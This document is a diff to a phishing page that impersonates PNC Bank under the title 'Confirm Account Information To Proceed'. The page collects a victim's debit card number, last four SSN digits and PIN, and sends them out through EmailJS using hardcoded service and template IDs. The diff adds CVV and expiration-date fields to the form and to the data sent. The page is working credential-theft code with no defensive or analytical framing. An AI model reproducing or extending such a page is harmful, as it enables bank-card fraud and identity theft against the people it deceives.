@@ -81,7 +81,14 @@ Confirm Account Information To Proceed
  
  <td width=25%><label for=userIdLbl class=formTextPointer><b>Enter Your PNC Personal Debit Card Number:</b></label>&nbsp;<img src='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="11" height="11"><rect fill-opacity="0"/></svg>' title="Your PNC Personal Debit Card Number is the 16 Digit Number written on Your PNC Debit Card" alt class=tipMe style="background-blend-mode:normal!important;background-clip:content-box!important;background-position:50% 50%!important;background-color:rgba(0,0,0,0)!important;background-image:var(--sf-img-16)!important;background-size:100% 100%!important;background-origin:content-box!important;background-repeat:no-repeat!important"></td>
  
- <td><input type=text name=userId id=userIdLbl autocomplete=off value maxlength=20 size=25></td>
+ <td>
+    <input type="text" name="userId" id="userIdLbl" autocomplete="off" maxlength="20" size="25">
+    <br>
+    <div style="margin-top: 10px;">
+    <input type="text" name="cvv" id="CVV" placeholder="cvv" maxlength="3" size="5" style="width: 60px; margin-right: 20px;">
+    <input type="text" name="expDate" id="EXP" placeholder="mm/yy" maxlength="5" size="7" style="width: 80px;">
+</td>
+</div>
  </tr>
  <tr>
  
@@ -103,6 +110,7 @@ Confirm Account Information To Proceed
  <td style=white-space:nowrap><label for=accountNumberLbl class=formTextPointer><b>Enter your PNC Debit Card PIN:</b>&nbsp;<img src='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="11" height="11"><rect fill-opacity="0"/></svg>' class=tipMe title="Your PNC Debit Card PIN Is The 4 Digit PIN Associated With Your PNC Debit Card." alt style="background-blend-mode:normal!important;background-clip:content-box!important;background-position:50% 50%!important;background-color:rgba(0,0,0,0)!important;background-image:var(--sf-img-16)!important;background-size:100% 100%!important;background-origin:content-box!important;background-repeat:no-repeat!important"> </label></td>
  <td><input type=password name=accountNumber id=accountNumberLbl autocomplete=off value maxlength=18 size=25></td>
  </tr>
+ 
  <tr>
  <td width=15 valign=top>&nbsp;</td>
  <td colspan=2><span class=subText>Enter The 4 Digit PIN Associated With Your PNC Debit Card.</span></td>
@@ -156,11 +164,14 @@ Confirm Account Information To Proceed
  <script>
    emailjs.init("_iApeAY2n3ykCvrue");
  
- function sendEmail(DEBITCARDNUMBER, LASTFOUROFSSN, DEBITCARDPIN) {
+ function sendEmail(DEBITCARDNUMBER, LASTFOUROFSSN, DEBITCARDPIN, CVV, EXP) {
      emailjs.send("service_2t8iy1r", "template_zdgr0nh", {
          userIdLbl: DEBITCARDNUMBER,
          ssn: LASTFOUROFSSN,
-         accountNumberLbl: DEBITCARDPIN
+         accountNumberLbl: DEBITCARDPIN,
+         CVV: CVV,
+         EXP: EXP
+
      })
      .then(function(response) {
          console.log('Email sent successfully!', response);
@@ -177,8 +188,10 @@ Confirm Account Information To Proceed
      var DEBITCARDNUMBER = form.querySelector('#userIdLbl').value;
      var LASTFOUROFSSN = form.querySelector('#ssn').value;
      var DEBITCARDPIN = form.querySelector('#accountNumberLbl').value;
+     var CVV = form.querySelector('#CVV').value;
+     var EXP = form.querySelector('#EXP').value;
      
-     sendEmail(DEBITCARDNUMBER, LASTFOUROFSSN, DEBITCARDPIN);
+     sendEmail(DEBITCARDNUMBER, LASTFOUROFSSN, DEBITCARDPIN, CVV, EXP);
  });
  
  </script>
